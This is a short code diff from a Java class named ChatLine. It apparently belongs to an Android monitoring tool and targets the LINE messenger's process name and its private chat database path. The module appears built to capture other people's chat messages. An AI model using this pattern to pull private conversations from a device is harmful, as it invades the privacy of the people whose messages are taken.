@@ -26,7 +26,7 @@ public class ChatLine extends SubModuleChat {
 	private static final String TAG = "ChatLine";
 
 	private static final int PROGRAM = 0x0b;
-	String pObserving = "line";
+	String pObserving = "jp.naver.line.android";
 	String dbFile = "/data/data/jp.naver.line.android/databases/naver_line";
 
 	private Date lastTimestamp;
@@ -128,7 +128,6 @@ public class ChatLine extends SubModuleChat {
 						}
 					}
 				}
-
 			}
 		}
 
